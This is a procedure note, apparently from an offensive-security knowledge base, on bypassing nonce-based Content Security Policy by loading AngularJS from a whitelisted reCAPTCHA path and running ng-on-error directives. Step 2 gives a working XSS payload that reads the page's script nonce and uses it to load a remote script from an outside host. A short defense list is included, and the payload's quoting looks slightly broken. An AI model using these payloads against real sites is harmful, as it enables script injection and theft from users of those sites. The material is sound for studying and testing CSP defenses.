---
tags:
  - csp-bypass
  - angularjs
  - xss
type: procedure
tools:
  - '[[tools/Browser-Developer-Tools]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/load-angularjs-script]]'
  - '[[commands/inject-angularjs-iframe]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:07.590Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 42f0dfa7-7438-497b-8722-7d6a6f95908e
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-AngularJS-for-CSP-Bypass

## Summary

This procedure loads AngularJS from a whitelisted reCAPTCHA domain to enable execution of Angular directives like ng-on-error, bypassing CSP restrictions that block unsafe-inline scripts while allowing the external AngularJS load.

## Description

In scenarios where CSP whitelists entire domains like 'https://www.google.com/recaptcha/' for script-src, attackers can inject HTML that loads AngularJS scripts from these domains. AngularJS enables directive-based JavaScript execution without violating CSP, as the directives are parsed by the loaded library. This is particularly effective against nonce-based CSP, as it sets the stage for stealing the nonce from the parent document. The target environment is web applications using nonce-enforced CSP with reCAPTCHA integration, assuming an HTML injection vector (e.g., via console for testing).

## Requirements

1. Access to browser developer console on the target page
2. Target site with CSP allowing script-src from reCAPTCHA domains
3. HTML injection capability

## Defense

Defensive measures and detection strategies:

- Implement 'strict-dynamic' in CSP to prevent directive-based bypasses
- Avoid whitelisting entire third-party domains; use specific script hashes or nonces
- Monitor for unexpected script loads from whitelisted domains in WAF logs
- Detect anomalous AngularJS usage or ng- directives in injected content

## Objectives

1. Load AngularJS library without CSP violation
2. Activate Angular directives for JS execution
3. Prepare for nonce theft and script injection

## Instructions

### Step 1: Load AngularJS Script

**Context**: Inject HTML to reference the whitelisted AngularJS script, enabling the library for directive parsing.

**Command** ([[commands/load-angularjs-script]]):
```javascript
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```

> This injects a script tag loading AngularJS and an img tag that triggers ng-on-error on load error, executing an alert to confirm JS execution. Expected output: Alert popup with '1'.

### Step 2: Inject Full Iframe Payload

**Context**: Use an iframe with srcdoc to isolate the Angular app and load the script within a controlled context.

**Command** ([[commands/inject-angularjs-iframe]]):
```javascript
document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>\n<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>\n<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(\"[nonce]\"");b=w.createElement(\"script\");b.src=\"//joaxcar.com/hack.js\";b.nonce=a.nonce;w.body.appendChild(b)'>\n</div>\n">`
```

> This sets the innerHTML of the first div to an iframe containing the ng-app, script load, and ng-on-error for further exploitation. Expected output: Iframe loads without CSP block, directives active.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/load-angularjs-script]]
- [[commands/inject-angularjs-iframe]]

## Tools Used

- [[tools/Browser-Developer-Tools]]

## Tags

- [[csp-bypass]]
- [[angularjs]]
- [[xss]]
